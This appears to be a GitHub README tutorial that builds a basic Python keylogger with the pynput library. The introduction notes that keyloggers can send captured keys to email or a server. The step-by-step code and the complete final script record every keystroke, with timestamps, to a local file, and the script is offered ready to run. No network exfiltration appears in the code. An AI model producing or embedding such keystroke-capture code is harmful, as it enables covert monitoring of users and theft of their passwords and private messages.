# Basic-Keylogger-with-Python
A keylogger program’s basic functionality is to monitor keystrokes continuously and then deliver those keystrokes to a specific location that can be either an email, server, or stored locally in the system.


##Step 1: To create our keylogger, we will use a Python library named pynput. With this Python library, you can fully control and monitor keyboard and mouse inputs.
Currently, it supports mouse and keyboard input devices and has the following sub-packages:
pynput.mouse – This package includes all the classes to control and monitor a mouse or trackpad.
pynput.keyboard – This package contains all the classes to work with the keyboard.
Install the pynput library using the pip install pynputcommand.


##Step 2: Now that we have installed the required Python library, let’s import all the required packages.
from pynput.keyboard import Key, Listener
import logging


##Step 3: In this step, we will specify the path where will the log file will be stored. This log file will include all the monitored keystrokes in the format specified.
log_dir = r"C:/users/himanshu/" 
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
Now, we will call the on_press() function, which takes keys as parameters.

def on_press(key):
   logging.info(str(key))


##Step 4: In this final step, we will create Listener instance and define the on_press() method in it and join it with the main program thread.

with Listener(on_press=on_press) as listener:
listener.join()
After completing all these steps, the final program should look like this and you can execute this script.

import pynput
from pynput.keyboard import Key, Listener
import logging
log_dir = r"C:/users/abiyath/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
   logging.info(str(key))
with Listener(on_press=on_press) as listener:
    listener.join()
    
##Step 5: Now, to check the output of our keylogger program type some random keys and open your log file.
